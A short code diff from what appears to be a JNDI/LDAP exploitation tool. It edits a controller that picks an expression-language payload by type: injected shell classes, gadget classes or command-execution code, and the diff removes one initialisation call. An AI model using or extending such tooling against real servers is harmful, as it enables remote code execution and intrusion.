@@ -94,7 +94,6 @@ public class ELProcessorController implements LdapController {
             Class<?> echoClass = Class.forName(ClassNameHandler.searchClassByName(suffixAfterDash(payloadType)));
             scriptBody = InjShell.injectClass(echoClass);
         } else if (payloadType.contains("M-")) {
-            InjShell.init(params);
             scriptBody = Gadgets.createClassT(suffixAfterDash(payloadType));
         } else if (payloadType.contains("command")) {
             scriptBody = helper.getExecCode(params[0]);
